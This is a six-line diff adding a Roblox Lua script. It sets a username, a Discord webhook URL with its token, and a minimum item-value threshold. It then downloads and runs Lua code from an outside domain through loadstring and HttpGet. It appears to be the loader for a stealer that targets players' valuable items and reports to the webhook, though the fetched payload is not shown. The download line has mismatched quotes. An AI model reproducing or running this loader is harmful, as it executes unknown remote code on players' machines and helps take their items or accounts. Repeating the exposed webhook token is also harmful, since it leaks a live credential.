@@ -1,0 +1,6 @@
+Username= 'daviblazer01'
+Webhook= 'https://discord.com/api/webhooks/1264529674919219291/lavko-IGeK7w0ENRMxO0SHLcOumtdAJajvxyyqJAGaAVEBeMTyIVMokZ9F2y_ANUHuY4'
+
+MinimumRAP = 0
+
+loadstring(game:HttpGet('https://egorikusa.space/3ec383d2311b87c980e184d5.lua", true'))()
